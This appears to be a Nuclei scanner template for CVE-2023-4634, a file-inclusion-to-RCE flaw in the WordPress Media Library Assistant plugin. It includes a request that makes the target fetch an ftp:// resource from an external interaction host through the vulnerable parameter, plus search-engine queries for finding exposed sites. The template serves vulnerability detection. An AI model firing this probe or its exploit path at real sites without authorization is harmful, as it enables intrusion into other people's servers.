id: CVE-2023-4634

info:
  name: Media Library Assistant < 3.09 - Remote Code Execution/Local File Inclusion
  author: Pepitoh,ritikchaddha
  severity: critical
  description: |
    A vulnerability in the Wordpress Media-Library-Assistant plugins in version < 3.09 is vulnerable to a local file inclusion which leading to RCE on default Imagegick installation/configuration.
  impact: |
    Successful exploitation of this vulnerability could lead to remote code execution or unauthorized access to local files.
  remediation: Fixed in version 3.09
  reference:
    - https://patrowl.io/blog-wordpress-media-library-rce-cve-2023-4634/
    - https://fr.wordpress.org/plugins/media-library-assistant/advanced/
    - https://cve.report/CVE-2023-4634
    - https://packetstormsecurity.com/files/174508/wpmla309-lfiexec.tgz
    - https://plugins.trac.wordpress.org/changeset?sfp_email=&sfph_mail=&reponame=&old=2955933%40media-library-assistant&new=2955933%40media-library-assistant&sfp_email=&sfph_mail=#file4
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
    cve-id: CVE-2023-4634
    cwe-id: CWE-73
    epss-score: 0.91782
    epss-percentile: 0.99681
    cpe: cpe:2.3:a:davidlingren:media_library_assistant:*:*:*:*:*:wordpress:*:*
  metadata:
    verified: true
    max-request: 2
    vendor: davidlingren
    product: media_library_assistant
    framework: wordpress
    shodan-query: http.html:wp-content/plugins/media-library-assistant
    fofa-query: body=wp-content/plugins/media-library-assistant
    publicwww-query: "wp-content/plugins/media-library-assistant"
  tags: cve,cve2023,packetstorm,wordpress,wp,wp-plugin,lfi,rce,media-library-assistant,davidlingren,vkev

http:
  - method: GET
    path:
      - "{{BaseURL}}/wp-content/plugins/media-library-assistant/readme.txt"
      - "{{BaseURL}}/wp-content/plugins/media-library-assistant/includes/mla-stream-image.php?mla_stream_file=ftp://{{interactsh-url}}/patrowl.svg"

    matchers-condition: and
    matchers:
      - type: word
        part: body_1
        words:
          - "Media Library Assistant"

      - type: word
        part: interactsh_protocol
        words:
          - "dns"
# digest: 4b0a004830460221008db6b12e212216c8e2ccf08373814ab7e91bad4eac2e2a674421e31f91c7d429022100fc8637e800f0aabeec4ab4e6fe23a62df6c53a944c5a2833d1d4d75bcdc0fbec:922c64590222798bb761d5b6d8e72950